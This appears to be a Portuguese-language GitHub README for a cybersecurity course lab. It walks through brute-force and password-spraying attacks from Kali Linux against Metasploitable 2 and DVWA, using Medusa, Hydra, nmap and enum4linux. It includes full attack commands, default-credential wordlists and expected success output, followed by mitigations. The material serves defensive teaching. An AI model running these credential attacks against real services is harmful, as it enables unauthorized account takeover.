# 🔐 Simulando Ataques de Brute Force com Medusa e Kali Linux

> **Projeto prático** desenvolvido como parte do desafio da [DIO](https://www.dio.me/) — Formação em Cybersecurity.  
> ⚠️ **Ambiente 100% controlado e isolado. Fins exclusivamente educacionais.**

---

## 📋 Índice

- [Sobre o Projeto](#sobre-o-projeto)
- [Ambiente Configurado](#ambiente-configurado)
- [Ferramentas Utilizadas](#ferramentas-utilizadas)
- [Cenário 1 — Brute Force em FTP](#cenário-1--brute-force-em-ftp)
- [Cenário 2 — Brute Force em Formulário Web DVWA](#cenário-2--brute-force-em-formulário-web-dvwa)
- [Cenário 3 — Password Spraying em SMB](#cenário-3--password-spraying-em-smb)
- [Wordlists Utilizadas](#wordlists-utilizadas)
- [Medidas de Mitigação](#medidas-de-mitigação)
- [Aprendizados e Reflexões](#aprendizados-e-reflexões)
- [Referências](#referências)

---

## Sobre o Projeto

Este repositório documenta a simulação de ataques de **força bruta** e **password spraying** em um ambiente virtualizado, utilizando o **Kali Linux** como máquina atacante e o **Metasploitable 2 / DVWA** como alvos vulneráveis intencionalmente.

O objetivo é compreender na prática como esses ataques funcionam, quais serviços são comumente explorados e — principalmente — como **preveni-los em ambientes reais**.

---

## Ambiente Configurado


┌─────────────────────────────────┐    rede host-only    ┌──────────────────────────────────┐
│     Kali Linux (atacante)       │ ◄──────────────────► │   Metasploitable 2 (alvo)        │
│     IP: 192.168.56.101          │                      │   IP: 192.168.56.102             │
│     VirtualBox — Host-Only      │                      │   VirtualBox — Host-Only         │
└─────────────────────────────────┘                      └──────────────────────────────────┘

| Componente       | Detalhes                                       |
|------------------|------------------------------------------------|
| Hypervisor       | VirtualBox 7.x                                 |
| Máquina Atacante | Kali Linux 2024.x (64-bit)                     |
| Máquina Alvo     | Metasploitable 2 / DVWA (Apache + PHP + MySQL) |
| Rede             | Host-Only (isolada, sem acesso à internet)      |

> 💡 A rede **host-only** garante isolamento total — nenhum tráfego sai para a internet.

---

## Ferramentas Utilizadas

| Ferramenta     | Função                                               |
|----------------|------------------------------------------------------|
| **Medusa**     | Brute force em múltiplos protocolos (FTP, SSH, SMB)  |
| **Hydra**      | Brute force em formulários web (HTTP-POST)           |
| **Nmap**       | Enumeração de portas e serviços                      |
| **Enum4linux** | Enumeração de usuários via SMB                       |
| **Smbclient**  | Validação de acesso após password spraying           |
| **DVWA**       | Aplicação web intencionalmente vulnerável            |

---

## Cenário 1 — Brute Force em FTP

### 1.1 Reconhecimento com Nmap

```bash
nmap -sV -p 21 192.168.56.102
```

Resultado esperado:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4

### 1.2 Criando a Wordlist

```bash
echo -e "admin\nroot\nftp\nmsfadmin\nuser" > users.txt
echo -e "123456\npassword\nadmin\nroot\nmsfadmin\n1234" > passwords.txt
```

### 1.3 Executando o Ataque com Medusa

```bash
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp -t 3 -v 6
```

| Parâmetro | Significado                       |
|-----------|-----------------------------------|
| `-h`      | Host alvo                         |
| `-U`      | Arquivo com lista de usuários     |
| `-P`      | Arquivo com lista de senhas       |
| `-M ftp`  | Módulo do protocolo (FTP)         |
| `-t 3`    | Número de threads paralelas       |
| `-v 6`    | Nível de verbosidade (máximo = 6) |

Output de sucesso esperado:
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]

### 1.4 Validação do Acesso

```bash
ftp 192.168.56.102
# Login: msfadmin | Senha: msfadmin
```

---

## Cenário 2 — Brute Force em Formulário Web DVWA

### 2.1 Configurando o DVWA

1. Acesse `http://192.168.56.102/dvwa`
2. Login com `admin / password`
3. Vá em **DVWA Security** → defina como **Low**
4. Acesse **Brute Force** no menu lateral

### 2.2 Ataque com Hydra

```bash
hydra -l admin -P passwords.txt \
  192.168.56.102 \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=abc123; security=low" \
  -V -t 1
```

### 2.3 Ataque com Medusa

```bash
medusa -h 192.168.56.102 \
  -u admin \
  -P passwords.txt \
  -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m FORM:username=^USER^&password=^PASS^&Login=Login \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -t 1 -v 6
```

Output esperado:
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]

---

## Cenário 3 — Password Spraying em SMB

### 3.1 Enumeração de Usuários

```bash
enum4linux -U 192.168.56.102
```

Output esperado:
user:[msfadmin] rid:[0x3e8]
user:[service] rid:[0x3e9]
user:[user]    rid:[0x3ea]

### 3.2 Password Spraying com Medusa

> 💡 **Password Spraying** = uma senha → muitos usuários → evita bloqueio de conta.

```bash
medusa -h 192.168.56.102 \
  -U smb_users.txt \
  -p msfadmin \
  -M smbnt \
  -t 2 -v 6
```

### 3.3 Validando com Smbclient

```bash
smbclient -L //192.168.56.102 -U msfadmin%msfadmin
```

---

## Wordlists Utilizadas

### users.txt
admin
root
msfadmin
user
ftp
service
administrator
guest

### passwords.txt
123456
password
admin
root
msfadmin
1234
qwerty
letmein
welcome
abc123

---

## Medidas de Mitigação

| Medida                     | Descrição                                                              |
|----------------------------|------------------------------------------------------------------------|
| **Account Lockout Policy** | Bloquear conta após N tentativas falhas                                |
| **MFA**                    | Segundo fator de autenticação mesmo com senha correta                  |
| **Rate Limiting**          | Limitar requisições por IP por minuto                                  |
| **CAPTCHA**                | Impede automação em formulários web                                    |
| **Fail2Ban**               | Banir IPs com múltiplas falhas automaticamente                         |
| **Senhas Fortes**          | Mínimo 12 caracteres com complexidade obrigatória                      |
| **Monitoramento / SIEM**   | Alertas em tempo real para múltiplas falhas de login                   |

### Exemplo de configuração Fail2Ban

```ini
# /etc/fail2ban/jail.local
[sshd]
enabled  = true
port     = ssh
maxretry = 3
findtime = 300
bantime  = 3600
```

---

## Aprendizados e Reflexões

**1. Senhas padrão são o maior risco**
Em todos os cenários as credenciais encontradas eram padrões de fábrica. A primeira linha de defesa é simplesmente trocar senhas padrão.

**2. Serviços expostos = superfície de ataque**
FTP, SMB e formulários sem proteção são alvos fáceis. O princípio de menor privilégio e exposição mínima reduz drasticamente o risco.

**3. Brute Force vs Password Spraying**
- **Brute Force**: muitas senhas → um usuário → risco de lockout
- **Password Spraying**: uma senha → muitos usuários → evita lockout, mais furtivo

**4. Documentação é parte da segurança**
Registrar testes e recomendações é essencial para o Blue Team implementar controles eficazes.

---

## Referências

- [Kali Linux — Site Oficial](https://www.kali.org/)
- [Medusa — Documentação](http://foofus.net/goons/jmk/medusa/medusa.html)
- [DVWA — Damn Vulnerable Web Application](https://dvwa.co.uk/)
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- [OWASP — Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [Fail2Ban — Documentação](https://www.fail2ban.org/)
- [Nmap — Manual Oficial](https://nmap.org/book/man.html)
- [DIO — Formação Cybersecurity](https://www.dio.me/)

---

## ⚠️ Disclaimer

> Este projeto foi desenvolvido **exclusivamente para fins educacionais** em ambiente virtualizado e isolado.  
> **Nunca execute estes ataques em sistemas sem autorização expressa.**  
> O uso não autorizado é crime previsto na **Lei 12.737/2012** e no **Marco Civil da Internet (Lei 12.965/2014)**.

---

<div align="center">

**Feito com 🔐 para a comunidade de Cybersecurity**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/seu-perfil)
[![GitHub](https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/seu-usuario)
[![DIO](https://img.shields.io/badge/DIO-0080FF?style=for-the-badge&logo=dio&logoColor=white)](https://www.dio.me/)

</div>

Como colar no GitHub:

Abra o repositório → clique em README.md → clique no lápis ✏️
Seleciona tudo com Ctrl+A e deleta
Cola o conteúdo acima com Ctrl+V
Clica em "Commit changes" → "Commit directly to main" → "Commit changes"


